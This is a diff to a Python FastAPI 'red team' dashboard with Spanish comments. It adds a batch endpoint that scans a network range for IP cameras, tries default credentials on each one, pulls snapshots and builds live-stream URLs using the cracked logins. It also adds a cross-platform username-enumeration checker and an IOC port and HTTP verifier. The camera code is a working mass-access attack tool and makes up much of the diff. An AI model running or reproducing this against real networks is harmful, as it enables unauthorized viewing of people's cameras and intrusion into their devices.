+    # 4. Construir URLs listos para usar
+    snap_url = f"/api/iot/snapshot?ip={ip}&port={port}"
+    if creds_found:
+        snap_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+    stream_path = rtsp_paths[0] if rtsp_paths else "/mjpg/video.mjpg"
+    stream_url = f"/api/iot/stream?ip={ip}&port={port}&path={urllib.parse.quote(stream_path, safe='')}"
+    if creds_found:
+        stream_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+    # 5. Determinar nivel de acceso
+    access_level = "none"
+    if snapshot_ok:
+        access_level = "full" if creds_found else "partial"
+    elif creds_found:
+        access_level = "partial"
+
+    # 6. Generar decision log (qué hizo el sistema y por qué)
+    decisions = []
+    if vendor != "unknown":
+        decisions.append({"step": "vendor_detection", "result": vendor, "cves_found": len(cves)})
+    if creds_found:
+        decisions.append({"step": "brute_force", "result": f"{creds_found['user']}:{creds_found['pwd']}", "creds_tested": len(DEFAULT_CREDS)})
+    else:
+        decisions.append({"step": "brute_force", "result": "no creds found", "creds_tested": len(DEFAULT_CREDS) if vendor != "unknown" else 0})
+    if snapshot_ok:
+        decisions.append({"step": "snapshot", "result": "OK", "path": snapshot_path_used, "size_bytes": snapshot_size})
+    else:
+        decisions.append({"step": "snapshot", "result": "failed", "paths_tried": len(snap_paths)})
+
+    return {
+        "ip": ip, "port": port,
+        "vendor": vendor,
+        "cves": cves,
+        "credentials": creds_found,
+        "access_level": access_level,
+        "snapshot": {
+            "available": snapshot_ok,
+            "path_used": snapshot_path_used,
+            "size_bytes": snapshot_size,
+            "url": snap_url if snapshot_ok else None,
+        },
+        "stream": {
+            "url": stream_url,
+            "path": stream_path,
+        },
+        "decision_log": decisions,
+        "recommended_action": (
+            "stream_live" if access_level == "full" else
+            "try_manual_creds" if access_level == "partial" else
+            "no_access"
+        ),
+    }
+
+
+@app.post("/api/iot/auto-access-batch")
+async def iot_auto_access_batch(body: dict = Body(...)):
+    """Escanea una red CIDR y ejecuta auto-access en TODAS las cámaras encontradas.
+    Devuelve un resumen con vendor, CVEs, creds, snapshot y stream de cada cámara."""
+    import ipaddress as _ipa
+    import httpx
+
+    cidr = str(body.get("cidr", "192.168.1.0/24")).strip()
+    try:
+        net = _ipa.ip_network(cidr, strict=False)
+    except Exception:
+        return JSONResponse({"error": f"CIDR inválido: {cidr}"}, status_code=400)
+
+    hosts = [str(h) for h in net.hosts()]
+    SCAN_PORTS = [554, 80, 443, 8080, 8000, 37777, 8554]
+    CHUNK_SIZE = 64
+    SEM = asyncio.Semaphore(32)
+
+    async def check_ports(ip: str):
+        open_ports = []
+        for port in SCAN_PORTS:
+            async with SEM:
+                try:
+                    _, writer = await asyncio.wait_for(
+                        asyncio.open_connection(ip, port), timeout=1.0)
+                    writer.close()
+                    await writer.wait_closed()
+                    open_ports.append(port)
+                except Exception:
+                    pass
+        return ip, open_ports
+
+    # 1. Escanear red en chunks
+    scan_results = []
+    for chunk_start in range(0, len(hosts), CHUNK_SIZE):
+        chunk = hosts[chunk_start:chunk_start + CHUNK_SIZE]
+        tasks = [check_ports(ip) for ip in chunk]
+        chunk_results = await asyncio.gather(*tasks)
+        scan_results.extend(chunk_results)
+
+    # 2. Filtrar dispositivos con puertos de cámara abiertos
+    camera_hosts = [(ip, ports) for ip, ports in scan_results if ports]
+
+    if not camera_hosts:
+        return {
+            "cidr": cidr,
+            "hosts_scanned": len(hosts),
+            "cameras_found": 0,
+            "cameras": [],
+            "summary": {"total": 0, "full_access": 0, "partial_access": 0, "no_access": 0}
+        }
+
+    # 3. Para cada cámara, ejecutar auto-access en paralelo (máx 8 simultáneas)
+    CAMERA_SEM = asyncio.Semaphore(8)
+
+    async def process_camera(ip: str, ports: list):
+        async with CAMERA_SEM:
+            port = ports[0] if ports else 80
+            try:
+                vendor = _identify_camera_vendor(ip, port)
+                cves = VENDOR_CVES.get(vendor, [])
+                rtsp_paths = RTSP_PATHS_BY_VENDOR.get(vendor, RTSP_PATHS_BY_VENDOR["Generic"])
+
+                # Probar creds
+                creds_found = None
+                scheme = "https" if port in (443, 8443) else "http"
+                base_url = f"{scheme}://{ip}:{port}"
+
+                async with httpx.AsyncClient(timeout=6, verify=False) as c:
+                    if vendor != "unknown":
+                        for user, pwd in DEFAULT_CREDS:
+                            try:
+                                r = await c.get(base_url + "/", auth=(user, pwd), follow_redirects=True)
+                                if r.status_code == 200 and len(r.content) > 500:
+                                    if "401" not in r.text[:200] and "unauthorized" not in r.text[:200].lower():
+                                        creds_found = {"user": user, "pwd": pwd}
+                                        break
+                            except Exception:
+                                continue
+
+                    # Intentar snapshot
+                    snapshot_ok = False
+                    snapshot_path_used = None
+                    snap_size = 0
+
+                    snap_paths = [
+                        "/snapshot.cgi", "/cgi-bin/snapshot.cgi", "/image/jpeg.cgi",
+                        "/cgi-bin/viewer/video.jpg", "/tmpfs/auto.jpg",
+                        "/ISAPI/Streaming/channels/101/picture", "/onvif/snapshot",
+                        "/mjpg/snapshot.cgi", "/cgi-bin/view/snapshot.cgi", "/snapshot.jpg",
+                    ]
+                    auth = (creds_found["user"], creds_found["pwd"]) if creds_found else None
+
+                    for snap_path in snap_paths:
+                        try:
+                            url = base_url + snap_path
+                            r = await c.get(url, auth=auth, follow_redirects=True,
+                                            headers={"User-Agent": "SourceSeal-Batch/3.1"})
+                            ct = r.headers.get("Content-Type", "")
+                            if r.status_code == 200 and ("image" in ct or "octet-stream" in ct or len(r.content) > 1000):
+                                snapshot_ok = True
+                                snapshot_path_used = snap_path
+                                snap_size = len(r.content)
+                                break
+                        except Exception:
+                            continue
+
+                # URLs listos
+                snap_url = f"/api/iot/snapshot?ip={ip}&port={port}"
+                if creds_found:
+                    snap_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+                stream_path = rtsp_paths[0] if rtsp_paths else "/mjpg/video.mjpg"
+                stream_url = f"/api/iot/stream?ip={ip}&port={port}&path={urllib.parse.quote(stream_path, safe='')}"
+                if creds_found:
+                    stream_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+                access_level = "none"
+                if snapshot_ok:
+                    access_level = "full" if creds_found else "partial"
+                elif creds_found:
+                    access_level = "partial"
+
+                return {
+                    "ip": ip, "port": port, "ports_open": ports,
+                    "vendor": vendor, "cves": cves,
+                    "credentials": creds_found,
+                    "access_level": access_level,
+                    "snapshot": {"available": snapshot_ok, "path": snapshot_path_used, "size": snap_size, "url": snap_url if snapshot_ok else None},
+                    "stream_url": stream_url,
+                }
+            except Exception as e:
+                return {"ip": ip, "port": port, "ports_open": ports, "vendor": "unknown", "error": str(e)[:100],
+                        "access_level": "none", "snapshot": {"available": False}, "credentials": None}
+
+    # 4. Procesar todas las cámaras
+    camera_tasks = [process_camera(ip, ports) for ip, ports in camera_hosts]
+    camera_results = await asyncio.gather(*camera_tasks)
+
+    # 5. Resumen
+    summary = {
+        "total": len(camera_results),
+        "full_access": sum(1 for c in camera_results if c.get("access_level") == "full"),
+        "partial_access": sum(1 for c in camera_results if c.get("access_level") == "partial"),
+        "no_access": sum(1 for c in camera_results if c.get("access_level") == "none"),
+        "vendors_detected": list(set(c.get("vendor", "unknown") for c in camera_results if c.get("vendor") != "unknown")),
+        "total_cves": sum(len(c.get("cves", [])) for c in camera_results),
+    }
+
+    return {
+        "cidr": cidr,
+        "hosts_scanned": len(hosts),
+        "cameras_found": len(camera_results),
+        "cameras": sorted(camera_results, key=lambda c: {"full": 0, "partial": 1, "none": 2}.get(c.get("access_level", "none"), 3)),
+        "summary": summary,
+    }
+
 
 # ═════════════════════════════════════════════════════════════════════════════
 #  ENDPOINTS — OSINT
@@ -2022,7 +2736,7 @@ async def root():
             "GET /api/honeypot", "POST /api/honeypot/start|stop|toggle|rotate",
             "GET /api/honeypot/status",
             "GET /api/soar/dags", "POST /api/soar/dags", "POST /api/soar/dry-run",
-            "GET /api/tip/iocs", "POST /api/tip/iocs", "DELETE /api/tip/iocs/{id}",
+            "GET /api/tip/iocs", "POST /api/tip/iocs", "DELETE /api/tip/iocs/{id}", "POST /api/tip/iocs/verify", "GET /api/tip/iocs/verify",
             "POST /api/tip/update", "POST /api/tip/import-stix",
             "GET /api/rasp/devices", "POST /api/rasp/devices", "DELETE /api/rasp/devices/{id}",
             "POST /api/terminal", "GET /api/settings", "POST /api/settings",
@@ -3753,360 +4467,32 @@ DISPOSABLE_DOMAINS = {
     "getnada.com", "dispostable.com", "tempail.com", "guerrillamailblock.com"
 }
 
+# (platforma, url, [patrones_html_que_indican_no_existe])
+# None = confiar solo en status code (GitHub, GitLab dan 404 real)
+# Plataformas con detección real validada en vivo (2026-08-20).
+# Metodología Sherlock: cada plataforma tiene su propia forma de indicar
+# "no existe" — status_code confiable, mensaje específico en HTML, o API.
+# Las 5 marcadas "unreliable" devuelven la MISMA respuesta exista o no la
+# cuenta desde este tipo de origen (anti-bot) — se reportan como null,
+# no se adivina.
 SOCIAL_PLATFORMS = [
-    ("GitHub", "https://github.com/{}"),
-    ("Twitter/X", "https://x.com/{}"),
-    ("Instagram", "https://instagram.com/{}"),
-    ("YouTube", "https://youtube.com/@{}"),
-    ("TikTok", "https://tiktok.com/@{}"),
-    ("Reddit", "https://reddit.com/user/{}"),
-    ("GitLab", "https://gitlab.com/{}"),
-    ("Medium", "https://medium.com/@{}"),
-    ("Steam", "https://steamcommunity.com/id/{}"),
+    ("GitHub", "https://www.github.com/{}", "status_code", None, r"^[a-zA-Z0-9](?:[a-zA-Z0-9]|-(?=[a-zA-Z0-9])){0,38}$", None),
+    ("GitLab", "https://gitlab.com/api/v4/users?username={}", "message_means_missing", ["[]"], None, "https://gitlab.com/{}", "vía API oficial de GitLab"),
+    ("YouTube", "https://www.youtube.com/@{}", "status_code", None, None, None),
+    ("TikTok", "https://www.tiktok.com/@{}", "message_means_missing", ['"statusCode":10221', "Govt. of India decided to block 59 apps"], None, None),
+    ("Telegram", "https://t.me/{}", "message_means_missing", ['<div class="tgme_page_context_link_icon">', 'tgme_username_link" href="tg://resolve?domain='], r"^[a-zA-Z0-9_]{3,32}[^_]$", None, "solo detecta usernames públicos indexables"),
+    ("Medium", "https://medium.com/feed/@{}", "message_means_missing", ["<body"], None, "https://medium.com/@{}", "vía feed RSS"),
+    ("Pinterest", "https://www.pinterest.com/oembed.json?url=https://www.pinterest.com/{}/", "status_code", None, None, "https://www.pinterest.com/{}/"),
+    ("Snapchat", "https://www.snapchat.com/add/{}", "status_code", None, r"^[a-z][a-z0-9-_.]{2,14}$", None),
+    ("Twitch", "https://www.twitch.tv/{}", "message_means_missing", ["content='Twitch is the world&#39;s leading video platform and community for gamers.'"], None, None),
+    ("Steam", "https://steamcommunity.com/id/{}/", "message_means_missing", ["The specified profile could not be found"], None, None),
+    # --- Sin verificación confiable sin autenticación (anti-bot confirmado) ---
+    ("Instagram", "https://instagram.com/{}", "unreliable", None, None, None, "Instagram devuelve 200/403 igual exista o no la cuenta"),
+    ("LinkedIn", "https://www.linkedin.com/in/{}", "unreliable", None, None, None, "LinkedIn bloquea scraping no autenticado"),
+    ("Facebook", "https://facebook.com/{}", "unreliable", None, None, None, "Facebook redirige a login para cualquier perfil"),
+    ("Reddit", "https://www.reddit.com/user/{}", "unreliable", None, None, None, "Reddit bloquea con 403/challenge anti-bot"),
+    ("Twitter/X", "https://x.com/{}", "unreliable", None, None, None, "x.com requiere JS; espejos nitter están caídos"),
 ]
-
-def _parse_rdn_tuple(rdn):
-    if not rdn:
-        return {}
-    res = {}
-    for r in rdn:
-        for k, v in r:
-            res[k] = v
-    return res
-
-async def _helper_get_ssl_cert(domain: str, port: int = 443) -> dict:
-    loop = asyncio.get_running_loop()
-    ctx = ssl.create_default_context()
-
-    def _fetch_verified():
-        with socket.create_connection((domain, port), timeout=5) as sock:
-            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
-                return ssock.getpeercert()
-
-    try:
-        cert = await loop.run_in_executor(None, _fetch_verified)
-        issuer = _parse_rdn_tuple(cert.get("issuer", ()))
-        subject = _parse_rdn_tuple(cert.get("subject", ()))
-        is_self_signed = (issuer == subject) if (issuer and subject) else False
-        return {
-            "domain": domain,
-            "port": port,
-            "issuer": issuer,
-            "subject": subject,
-            "notBefore": cert.get("notBefore"),
-            "notAfter": cert.get("notAfter"),
-            "serialNumber": cert.get("serialNumber"),
-            "version": cert.get("version"),
-            "self_signed": is_self_signed,
-            "verified": True,
-            "error": None
-        }
-    except Exception as err:
-        try:
-            def _fetch_pem():
-                return ssl.get_server_certificate((domain, port), timeout=5)
-
-            pem = await loop.run_in_executor(None, _fetch_pem)
-            proc = await asyncio.create_subprocess_exec(
-                "openssl", "x509", "-noout", "-issuer", "-subject", "-dates", "-serial",
-                stdin=asyncio.subprocess.PIPE,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            stdout, _ = await asyncio.wait_for(proc.communicate(input=pem.encode()), timeout=5)
-            out_str = stdout.decode()
-
-            parsed = {}
-            for line in out_str.splitlines():
-                if "=" in line:
-                    k, v = line.split("=", 1)
-                    parsed[k.strip().lower()] = v.strip()
-
-            issuer_str = parsed.get("issuer", "")
-            subject_str = parsed.get("subject", "")
-            is_self = (issuer_str == subject_str) if (issuer_str and subject_str) else True
-
-            return {
-                "domain": domain,
-                "port": port,
-                "issuer": issuer_str,
-                "subject": subject_str,
-                "notBefore": parsed.get("notbefore"),
-                "notAfter": parsed.get("notafter"),
-                "serialNumber": parsed.get("serial"),
-                "version": None,
-                "self_signed": is_self,
-                "verified": False,
-                "error": str(err)
-            }
-        except Exception:
-            return {
-                "domain": domain,
-                "port": port,
-                "issuer": None,
-                "subject": None,
-                "notBefore": None,
-                "notAfter": None,
-                "serialNumber": None,
-                "version": None,
-                "self_signed": None,
-                "verified": False,
-                "error": str(err)
-            }
-
-def _detect_technologies(headers: dict) -> list:
-    techs = []
-    headers_lower = {str(k).lower(): str(v) for k, v in headers.items()}
-
-    server = headers_lower.get("server", "")
-    if server:
-        techs.append(f"Server: {server}")
-
-    x_powered_by = headers_lower.get("x-powered-by", "")
-    if x_powered_by:
-        techs.append(f"X-Powered-By: {x_powered_by}")
-
-    x_aspnet = headers_lower.get("x-aspnet-version") or headers_lower.get("x-aspnetmvc-version")
-    if x_aspnet:
-        techs.append(f"ASP.NET ({x_aspnet})")
-
-    x_gen = headers_lower.get("x-generator", "")
-    if x_gen:
-        techs.append(f"Generator: {x_gen}")
-
-    if "cf-ray" in headers_lower or "cloudflare" in server.lower() or "cf-cache-status" in headers_lower:
-        techs.append("Cloudflare")
-
-    if "x-varnish" in headers_lower or "varnish" in headers_lower.get("via", "").lower():
-        techs.append("Varnish Cache")
-
-    if "x-github-request-id" in headers_lower:
-        techs.append("GitHub Pages")
-
-    cookies = headers_lower.get("set-cookie", "")
-    if "phpsessid" in cookies.lower():
-        techs.append("PHP")
-    if "jsessionid" in cookies.lower():
-        techs.append("Java/Servlet")
-    if "asp.net_sessionid" in cookies.lower() or "aspsessionid" in cookies.lower():
-        techs.append("ASP.NET")
-    if "laravel_session" in cookies.lower():
-        techs.append("Laravel")
-    if "wordpress_" in cookies.lower() or "wp-settings-" in cookies.lower():
-        techs.append("WordPress")
-    if "csrftoken" in cookies.lower():
-        techs.append("Django")
-
-    return list(dict.fromkeys(techs))
-
-
-@app.get("/api/osint/dns/{domain}")
-async def osint_dns(domain: str):
-    cached = _osint_get_cache(domain, "dns")
-    if cached:
-        return cached[0]
-
-    record_types = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA"]
-    records = {}
-
-    async def fetch_record(rtype: str):
-        try:
-            proc = await asyncio.create_subprocess_exec(
-                "dig", "+short", rtype, domain,
-                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
-            )
-            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
-            lines = [l.strip() for l in stdout.decode().splitlines() if l.strip() and not l.strip().startswith(";")]
-            return rtype, lines
-        except FileNotFoundError:
-            raise FileNotFoundError("dig_not_installed")
-        except Exception:
-            return rtype, []
-
-    try:
-        results = await asyncio.gather(*[fetch_record(rt) for rt in record_types])
-        for rtype, lines in results:
-            records[rtype] = lines
-    except FileNotFoundError:
-        raise HTTPException(
-            status_code=503,
-            detail="dig no instalado. Instala: pkg install bind-tools (Termux) o apt install bind9-dnsutils (Linux)"
-        )
-
-    result = {
-        "domain": domain,
-        "records": records,
-        "timestamp": datetime.now().isoformat()
-    }
-    _osint_cache_result(domain, "dns", result)
-    return result
-
-
-@app.get("/api/osint/headers/{domain}")
-async def osint_headers(domain: str):
-    cached = _osint_get_cache(domain, "headers")
-    if cached:
-        return cached[0]
-
-    headers = {}
-    status_code = None
-    url_used = None
-    error = None
-
-    for scheme in ["https", "http"]:
-        target_url = f"{scheme}://{domain}"
-        try:
-            async with httpx.AsyncClient(follow_redirects=True, timeout=10.0, verify=False) as client:
-                resp = await client.get(target_url)
-                headers = dict(resp.headers)
-                status_code = resp.status_code
-                url_used = str(resp.url)
-                break
-        except Exception as e:
-            error = str(e)
-
-    tls_info = None
-    try:
-        tls_info = await _helper_get_ssl_cert(domain, 443)
-    except Exception as e:
-        tls_info = {"error": str(e)}
-
-    technologies = _detect_technologies(headers)
-
-    result = {
-        "domain": domain,
-        "url": url_used,
-        "status_code": status_code,
-        "headers": headers,
-        "technologies": technologies,
-        "tls": tls_info,
-        "error": error if not headers else None,
-        "timestamp": datetime.now().isoformat()
-    }
-
-    _osint_cache_result(domain, "headers", result)
-    return result
-
-
-@app.get("/api/osint/reverse/{ip}")
-async def osint_reverse(ip: str):
-    if not _valid_ip(ip):
-        raise HTTPException(status_code=400, detail="Dirección IP inválida")
-
-    cached = _osint_get_cache(ip, "reverse")
-    if cached:
-        return cached[0]
-
-    loop = asyncio.get_running_loop()
-
-    hostname = None
-    aliases = []
-    try:
-        res = await loop.run_in_executor(None, socket.gethostbyaddr, ip)
-        hostname = res[0]
-        aliases = res[1]
-    except Exception:
-        hostname = None
-
-    geo_data = {}
-    try:
-        async with httpx.AsyncClient(timeout=10.0) as client:
-            resp = await client.get(f"https://ipwho.is/{ip}")
-            if resp.status_code == 200:
-                geo_data = resp.json()
-    except Exception as e:
-        geo_data = {"error": str(e)}
-
-    result = {
-        "ip": ip,
-        "hostname": hostname,
-        "aliases": aliases,
-        "geo": geo_data,
-        "timestamp": datetime.now().isoformat()
-    }
-
-    _osint_cache_result(ip, "reverse", result)
-    return result
-
-
-@app.get("/api/osint/breach/{email}")
-async def osint_breach(email: str):
-    cached = _osint_get_cache(email, "breach")
-    if cached:
-        return cached[0]
-
-    email_pattern = r"^[^@\s]+@([^@\s]+\.[^@\s]+)$"
-    match = re.match(email_pattern, email)
-    valid_format = bool(match)
-    domain = match.group(1).lower() if match else ""
-
-    is_disposable = domain in DISPOSABLE_DOMAINS if domain else False
-
-    mx_records = []
-    if domain:
-        try:
-            proc = await asyncio.create_subprocess_exec(
-                "dig", "+short", "MX", domain,
-                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
-            )
-            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
-            mx_records = [l.strip() for l in stdout.decode().splitlines() if l.strip() and not l.strip().startswith(";")]
-        except Exception:
-            mx_records = []
-
-    breaches = []
-    status_note = "Local validation + MX verification completed."
-
-    headers = {"User-Agent": "RedTeam-Dashboard-OSINT/1.0"}
-    async with httpx.AsyncClient(timeout=8.0, headers=headers) as client:
-        try:
-            resp = await client.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
-            if resp.status_code == 200:
-                breaches = resp.json()
-                status_note = "Breaches retrieved from HaveIBeenPwned."
-            elif resp.status_code in (401, 403):
-                status_note = "HaveIBeenPwned requires API key. Tried free fallback API."
-        except Exception:
-            pass
-
-        if not breaches:
-            try:
-                resp = await client.get(f"https://leakcheck.io/api/public?check={email}")
-                if resp.status_code == 200:
-                    data = resp.json()
-                    if data.get("success"):
-                        breaches = data.get("sources", [])
-                        status_note = "Breach data retrieved from LeakCheck free API."
-            except Exception:
-                pass
-
-        if not breaches and "HaveIBeenPwned" not in status_note and "LeakCheck" not in status_note:
-            try:
-                resp = await client.get(f"https://api.dehash.lt/api/search?email={email}")
-                if resp.status_code == 200:
-                    data = resp.json()
-                    if isinstance(data, list):
-                        breaches = data
-                        status_note = "Breach data retrieved from DeHash API."
-                    elif isinstance(data, dict) and data.get("results"):
-                        breaches = data.get("results")
-                        status_note = "Breach data retrieved from DeHash API."
-            except Exception:
-                pass
-
-    result = {
-        "email": email,
-        "valid_format": valid_format,
-        "domain": domain,
-        "disposable": is_disposable,
-        "mx_records": mx_records,
-        "breaches": breaches,
-        "status_note": status_note,
-        "timestamp": datetime.now().isoformat()
-    }
-
-    _osint_cache_result(email, "breach", result)
-    return result
 
 
 @app.get("/api/osint/social/{username}")
@@ -4115,49 +4501,110 @@ async def osint_social(username: str):
     if cached:
         return cached[0]
 
-    semaphore = asyncio.Semaphore(5)
+    from urllib.parse import quote
+    raw_username = username.replace("@", "").strip()
+
+    warnings = []
+    if " " in raw_username:
+        warnings.append(
+            "El input contiene espacios — parece un nombre completo, no un "
+            "username. Las plataformas con validación de formato marcarán "
+            "'formato inválido'. Prueba variantes sin espacios."
+        )
+
+    semaphore = asyncio.Semaphore(10)
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     }
+    results = []
 
-    async def check_platform(client, platform_name: str, url_tmpl: str):
-        url = url_tmpl.format(username)
+    async def check_platform(client, entry):
+        # entry = (name, probe_url, check_type, error_msgs, regex, display_url, note)
+        name = entry[0]
+        probe_url_tmpl = entry[1]
+        check_type = entry[2]
+        error_msgs = entry[3] if len(entry) > 3 else None
+        regex = entry[4] if len(entry) > 4 else None
+        display_url_tmpl = entry[5] if len(entry) > 5 else None
+        note = entry[6] if len(entry) > 6 else None
+
+        u = quote(raw_username, safe="")
+        display_url = (display_url_tmpl or probe_url_tmpl).replace("{}", u)
+        target_url = probe_url_tmpl.replace("{}", u)
+
+        # 1. Validar formato antes de gastar el request
+        if regex and not re.match(regex, raw_username):
+            results.append({
+                "platform": name, "url": display_url,
+                "exists": False, "status_code": None,
+                "note": "Formato de username inválido para esta plataforma"
+            })
+            return
+
+        # 2. Plataformas sin verificación confiable
+        if check_type == "unreliable":
+            results.append({
+                "platform": name, "url": display_url,
+                "exists": None, "status_code": None,
+                "note": note or "No hay forma confiable de verificar sin autenticación"
+            })
+            return
+
         async with semaphore:
             try:
-                resp = await client.get(url)
+                resp = await client.get(target_url)
                 status_code = resp.status_code
-                exists = (200 <= status_code < 300)
-                return {
-                    "platform": platform_name,
-                    "url": url,
-                    "exists": exists,
-                    "status_code": status_code
+
+                if status_code == 429 or status_code == 403:
+                    exists = None
+                elif check_type == "status_code":
+                    exists = (200 <= status_code < 300)
+                elif check_type == "message_means_missing":
+                    if 200 <= status_code < 300:
+                        # NO truncar el body — el marcador puede estar a los ~26KB (Steam)
+                        found_error = any(msg in resp.text for msg in (error_msgs or []))
+                        exists = not found_error
+                    else:
+                        exists = False
+                else:
+                    exists = (200 <= status_code < 300)
+
+                entry_result = {
+                    "platform": name, "url": display_url,
+                    "exists": exists, "status_code": status_code
                 }
+                if note:
+                    entry_result["note"] = note
+                results.append(entry_result)
             except Exception as e:
-                return {
-                    "platform": platform_name,
-                    "url": url,
-                    "exists": False,
-                    "status_code": None,
-                    "error": str(e)
-                }
+                results.append({
+                    "platform": name, "url": display_url,
+                    "exists": False, "status_code": None,
+                    "error": str(e)[:100],
+                    "note": "Fallo de conexión — no confirmado ni descartado"
+                })
 
     async with httpx.AsyncClient(timeout=10.0, follow_redirects=True, headers=headers) as client:
-        results = await asyncio.gather(
-            *[check_platform(client, p, u) for p, u in SOCIAL_PLATFORMS]
+        await asyncio.gather(
+            *[check_platform(client, entry) for entry in SOCIAL_PLATFORMS]
         )
 
-    total_found = sum(1 for r in results if r.get("exists"))
+    total_found = sum(1 for r in results if r.get("exists") is True)
+    total_unreliable = sum(1 for r in results if r.get("exists") is None)
     result = {
-        "username": username,
+        "username": raw_username,
         "results": results,
+        "found": [r for r in results if r.get("exists") is True],
+        "unreliable": [r for r in results if r.get("exists") is None],
         "total_found": total_found,
+        "total_unreliable": total_unreliable,
+        "total_checked": len(results),
+        "warnings": warnings,
         "timestamp": datetime.now().isoformat()
     }
 
-    _osint_cache_result(username, "social", result)
+    _osint_cache_result(raw_username, "social", result)
     return result
-
 
 @app.get("/api/osint/cert/{domain}")
 async def osint_cert(domain: str):
@@ -5555,6 +6002,178 @@ async def v2_generate_report(request: Request):
 
 # == END V2 MERGE ==
 
+# ═════════════════════════════════════════════════════════════════════════════
+#  IOC VERIFIER — Verificación activa de Indicadores de Compromiso
+#  DNS lookup, port scan, HTTP probe, SSL check, WHOIS
+# ═════════════════════════════════════════════════════════════════════════════
+
+import socket as _ioc_socket
+import ssl as _ioc_ssl
+import concurrent.futures as _ioc_pool
+from datetime import datetime as _ioc_dt
+
+def _verify_single_ioc(ioc: dict) -> dict:
+    """Verifica un IOC individual: DNS, puertos, HTTP, SSL."""
+    ioc_type = ioc.get("type", "ip")
+    ioc_value = ioc.get("value", ioc.get("ioc", ""))
+    result = {
+        "ioc": ioc_value,
+        "type": ioc_type,
+        "verified_at": _ioc_dt.now().isoformat(),
+        "checks": {},
+        "alive": False,
+    }
+
+    # 1. DNS resolution (para dominios/IPs)
+    try:
+        if ioc_type in ("domain", "url"):
+            resolved = _ioc_socket.getaddrinfo(ioc_value, None, proto=_ioc_socket.IPPROTO_TCP)
+            ips = list(set(addr[4][0] for addr in resolved))
+            result["checks"]["dns"] = {"status": "ok", "ips": ips}
+            target_ip = ips[0] if ips else None
+            result["alive"] = bool(ips)
+        elif ioc_type == "ip":
+            try:
+                _ioc_socket.inet_aton(ioc_value)
+                result["checks"]["dns"] = {"status": "ok", "ip": ioc_value}
+                target_ip = ioc_value
+                result["alive"] = True
+            except _ioc_socket.error:
+                result["checks"]["dns"] = {"status": "error", "error": "IP inválida"}
+                target_ip = None
+        elif ioc_type == "hash":
+            result["checks"]["hash"] = {"status": "info", "value": ioc_value, "len": len(ioc_value)}
+            result["alive"] = None  # No se puede verificar un hash con red
+            return result
+        else:
+            target_ip = ioc_value
+    except Exception as e:
+        result["checks"]["dns"] = {"status": "error", "error": str(e)}
+        return result
+
+    if not target_ip:
+        return result
+
+    # 2. Port scan (puertos comunes)
+    ports_to_check = ioc.get("ports", [80, 443, 22, 554, 8080, 3389, 23])
+    if isinstance(ports_to_check, str):
+        ports_to_check = [int(p.strip()) for p in ports_to_check.split(",") if p.strip().isdigit()]
+    if not ports_to_check:
+        ports_to_check = [80, 443, 22, 554, 8080, 3389, 23]
+
+    open_ports = []
+    for port in ports_to_check[:10]:  # max 10 puertos
+        try:
+            s = _ioc_socket.socket(_ioc_socket.AF_INET, _ioc_socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            if s.connect_ex((target_ip, port)) == 0:
+                open_ports.append(port)
+                result["alive"] = True
+            s.close()
+        except Exception:
+            pass
+    result["checks"]["ports"] = {"open": open_ports, "scanned": ports_to_check[:10]}
+
+    # 3. HTTP probe
+    for port in open_ports:
+        if port in (80, 8080, 8000, 443, 8443):
+            protocol = "https" if port in (443, 8443) else "http"
+            url = f"{protocol}://{ioc_value}" if ioc_type in ("domain", "url") else f"{protocol}://{target_ip}"
+            try:
+                import subprocess as _ioc_sub
+                cmd = ["curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}|%{time_total}",
+                       "--max-time", "5", "-k", url]
+                out = _ioc_sub.run(cmd, capture_output=True, text=True, timeout=7)
+                if out.stdout:
+                    parts = out.stdout.split("|")
+                    result["checks"]["http"] = {
+                        "status": "ok",
+                        "code": parts[0] if parts else "000",
+                        "response_time": parts[1] if len(parts) > 1 else "0",
+                        "url": url,
+                    }
+            except Exception as e:
+                result["checks"]["http"] = {"status": "error", "error": str(e)}
+            break
+
+    # 4. SSL cert check (para HTTPS)
+    if 443 in open_ports:
+        try:
+            ctx = _ioc_ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = _ioc_ssl.CERT_NONE
+            with _ioc_socket.create_connection((target_ip, 443), timeout=5) as sock:
+                with ctx.wrap_socket(sock, server_hostname=ioc_value if ioc_type in ("domain","url") else target_ip) as ssock:
+                    cert = ssock.getpeercert()
+                    result["checks"]["ssl"] = {
+                        "status": "ok",
+                        "issuer": dict(x[0] for x in cert.get("issuer", [])),
+                        "expires": cert.get("notAfter", ""),
+                    }
+        except Exception as e:
+            result["checks"]["ssl"] = {"status": "error", "error": str(e)}
+
+    return result
+
+
+@app.post("/api/tip/iocs/verify")
+async def tip_iocs_verify(request: Request):
+    """Verifica IOCs activamente: DNS, puertos abiertos, HTTP, SSL.
+    Acepta una lista de IOCs o verifica todos los almacenados si no se envía body."""
+    try:
+        body = await request.json()
+        if isinstance(body, list):
+            iocs = body
+        elif isinstance(body, dict) and "iocs" in body:
+            iocs = body["iocs"]
+        else:
+            iocs = [body]
+    except Exception:
+        iocs = _load_json(IOC_FILE, [])
+
+    if not iocs:
+        iocs = _load_json(IOC_FILE, [])
+
+    if not iocs:
+        return {"ok": True, "results": [], "total": 0, "alive": 0}
+
+    # Verificar en paralelo (max 8 concurrentes)
+    with _ioc_pool.ThreadPoolExecutor(max_workers=8) as pool:
+        results = list(pool.map(_verify_single_ioc, iocs[:50]))
+
+    alive_count = sum(1 for r in results if r.get("alive"))
+    return {
+        "ok": True,
+        "results": results,
+        "total": len(results),
+        "alive": alive_count,
+        "dead": len(results) - alive_count,
